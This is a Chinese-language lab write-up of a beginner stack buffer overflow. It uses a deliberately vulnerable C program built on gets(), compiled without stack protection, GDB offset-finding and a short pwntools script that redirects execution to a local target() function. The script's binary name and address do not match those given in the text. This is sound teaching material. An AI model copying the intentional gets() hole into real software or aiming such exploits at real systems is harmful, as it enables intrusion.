---
title: 實驗緩衝區溢位漏洞 (Buffer Overflow)
toc: true
tags:
  - Reverse
  - Security
  - Linux
  - Buffer Overflow
  - exploit
aside: true
categories: 實作紀錄
abbrlink: Buffer_Overflow_Test
date: 2020-03-11 21:09:15
description:
cover: /img/BOF.png
---

## 前言

**緩衝區溢位漏洞（Buffer Overflow)** 是軟體和系統安全領域中最常見且嚴重的安全漏洞之一。現今數位時代中複雜的軟體系統常常面臨著來自駭客或惡意使用者的威脅。緩衝區溢位漏洞便是這些威脅中最令人擔憂的一種，因其對計算機系統造成的威脅程度不可忽視。

簡單來說，緩衝區溢位漏洞是指當程式碼嘗試將資料存儲在一個預先定義大小的**記憶體區塊（稱為緩衝區）** 中時，若輸入的資料量超過了緩衝區所能容納的最大值，多餘的資料將會溢出到相鄰的記憶體區域，從而可能覆蓋控制程式執行的指令或資料，進而產生意料之外的行為。

造成緩衝區溢位漏洞的根本原因是程式設計上的疏忽與錯誤。當程式開發者**未能正確處理使用者輸入的情況**，特別是**未能對輸入進行充分的驗證和限制**，就可能引發這樣的漏洞。攻擊者通常會藉由傳送特製的惡意輸入數據，利用這些未經檢查的輸入，使程式遭受緩衝區溢位攻擊。這種攻擊手法已經存在多年，並且在歷史上造成了許多嚴重的安全事件。

過去，許多知名的緩衝區溢位漏洞被廣泛報導，其中一些甚至對全球資訊安全產生了深遠影響。例如，著名的 `Code Red` 和 `Nimda` 蠕蟲就是利用緩衝區溢位漏洞來快速感染數以萬計的主機。同樣的，`Slammer` 蠕蟲也是利用微軟SQL Server中的緩衝區溢位漏洞，導致了全球互聯網流量的瞬間飆升。這些事件提醒了整個科技業界必須高度重視緩衝區溢位漏洞的威脅。

> SQL Slammer - https://en.wikipedia.org/wiki/SQL_Slammer

所以這篇文章就來簡單的實驗一下緩衝區溢位漏洞，至少讓我有點概念。

## 環境配置

在環境配置方面，我們使用 **Windows Subsystem for Linux (WSL)** 平台來配置開發環境，並且使用 `Ubuntu 20.04 LTS` 作為開發環境。我們將在這個環境中安裝所需的工具，包括 `Python3`、`Pwntool`，以及用於進行 GDB 除錯 的 `PEDA` 插件。

WSL 提供了一個在 Windows 系統上運行 Linux 發行版的功能，讓我們能夠在 Windows 環境中進行 Linux 相關的開發工作。Ubuntu 20.04 LTS 是一個穩定且常見的 Linux 發行版，其廣泛應用於開發和測試環境。

在進行環境配置之前，我們需要確保已安裝並運行了 WSL。安裝 WSL 可以參考微軟官方文檔或相關的線上教程。
> https://learn.microsoft.com/zh-tw/windows/wsl/install

接下來，我們需要在 WSL 中安裝 Python3 和 Pwntool。Pwntool 是在 CTF中很常見，特別針對漏洞利用開發的 Python 函式庫。

在安裝 Pwntool 前，我們需要確保 git 已經在 WSL 中安裝，若未安裝則可使用以下命令：

```shell
sudo apt update
sudo apt install git
```
接下來，我們可以透過以下方法來安裝 Pwntool：

```
sudo apt install python3 python3-pip
pip3 install --upgrade pip
pip3 install pwntools
```

現在我們已經在 WSL 中完成 Python3 和 Pwntool 的安裝。

接下來，我們將配置 GDB DEBUG環境，使用 PEDA 插件來幫助我們進行緩衝區溢位漏洞的演練。

```shell
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

最後，這裡提供了一個簡單的 C 程式 `buffer_test.c` 作為我們實際演示緩衝區溢位漏洞的目標。該程式包含了一個 `uname()` 函數，其中使用了 `gets()` 函數來接收使用者輸入，但是未對輸入進行足夠的驗證，從而可能引發緩衝區溢位漏洞。

buffer_test.c
```c
#include <stdio.h>
void target(){
    printf("Oh No! Your Hacker.\n");
}
void uname(){
    char str[16];
    printf("input your name: \n");
    gets(str);
    printf("Hello, %s \n", str);
}
int main(){
    setvbuf(stdin, NULL, _IONBF, 0);  //清除暫存
    setvbuf(stdout, NULL, _IONBF, 0);
    uname();
    return 0;
}
```
{% note info %}
程式中含有危險輸入函式 **gets** ，作為 Buffer Overflow的練習程式
{% endnote %}

## 實驗步驟
### 一、 編譯程式

首先，我們需要編譯名為 `buffer_test.c` 的程式碼，以便進行後續的實驗。編譯時我們需要關閉 **Stack Canary** 的防護機制，可以使用以下指令：

```shell
gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie
```

{% note info %}
`-fno-stack-protector` ：關閉 Stack Canary 的防護機制
{% endnote %}

## 二、 檢查防護措施

在實驗開始前，需要確認目標程式的安全防護機制。可以用 `checksec 指令可以快速查看目標執行檔的相關安全措施：

```shell
checksec buffer_test
```
![](https://i.imgur.com/HuO3k3R.png)


## 三、 確認目標：

在進行攻擊之前，需要先確認目標。在這個實驗中，我們的目標是執行 `target 函式，因此需要找到該函式的記憶體位址，並蓋過函式返回位址。
   

## 四、確認函式記憶體位址

透過 GDB 來查詢 `target` 函式的記憶體位址：

```shell
gdb buffer_test
gdb-peda$ disas target
```
![](https://i.imgur.com/l1S7BAX.png)

從上圖可得知，此function開始的位址在 `0x0000000000401196`
得知了函式位址後，接著要知道如何從 input 蓋到 ret


## 五、測試

在實際進行攻擊之前，我們先在 GDB 中執行程式，並觀察它的行為：

```shell
gdb-peta$ r    //先跑跑看
```
![](https://i.imgur.com/jdWT4BI.png)

程式會要求使用者輸入名字，並在名字輸入完畢後回應 `Hello, {name}`。由於原程式中容納使用者輸入的陣列只有 16 個位元組（`RBP ~ RBP-16`），**所以我們可以透過輸入超過 16 個位元組的資料來觀察它的行為。**

![Imgur](https://i.imgur.com/HOnCJiX.png)

如圖所示，當輸入超過 24 個位元組時，程式就會發生緩衝區溢位，並且在字元 v 後就發生崩潰。這表示我們需要至少 24 個位元組的輸入，才能成功蓋過函式返回位址。

> 所以再 `8Bytes` 即可蓋完 ret address

> RBP 那顯示只到 qrstuvwx，意思就是輸到24byte就爆了


## 六、實際用 Python 來覆蓋

為了進行實際的攻擊，將使用 Python 撰寫攻擊腳本。這個腳本將使用 `Pwntools` 函式庫來進行攻擊，蓋過程式中的函式返回位址，使之執行 `target` 函式。

攻擊腳本 attack.py 如下：
```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
r = process('./demo')
r.recvuntil('input your name:') 
targer_address = p64(0x400667)
r.sendline(b'A' * 24 + targer_address)
r.interactive()
```

在攻擊腳本中，我們使用 `process()` 函式來執行 buffer_test 程式。接著，透過 `recvuntil()` 函式等待程式顯示 **"input your name:"** 的提示，然後將我們事先計算好的 `target` 函式位址加入到輸入資料中。最後，使用 `interactive()` 函式進入互動模式，以便觀察攻擊的結果。

- `recvuntil()`：receive until，可接收特定字串，當到達目標字串時，執行xx指令
- `p8()`、`p32()`、`p64()`

   ![](https://i.imgur.com/HZzm1tq.png)

  - `p32`：對data 打包 (32bit  integer)  //u32：解包
  - `p64`：對 data 打包 (64bit integer)  //u64 :解包
  轉成位址

- `sendline(payload)`：發送payload，並換行
- `interactive()`：進入交互模式，可用來執行本地或遠端執行檔

## 七、 執行攻擊腳本

最後，我們執行攻擊腳本以進行攻擊：
```shell
python3 attack.py
```
![](https://i.imgur.com/Hr1LHfQ.png)

攻擊成功後，程式將會執行 `target` 函式，並顯示 "Oh No! Your Hacker." 的訊息，證明我們成功地利用緩衝區溢位漏洞進行了攻擊。

{% note success %}
成功執行target函式!
{% endnote %}

{% note warning %}
請記得在實際環境中應用所學的知識時，確保遵守相關法律法規，並僅在合法授權的情況下進行安全測試與漏洞利用。
{% endnote %}

## 參考資料
https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow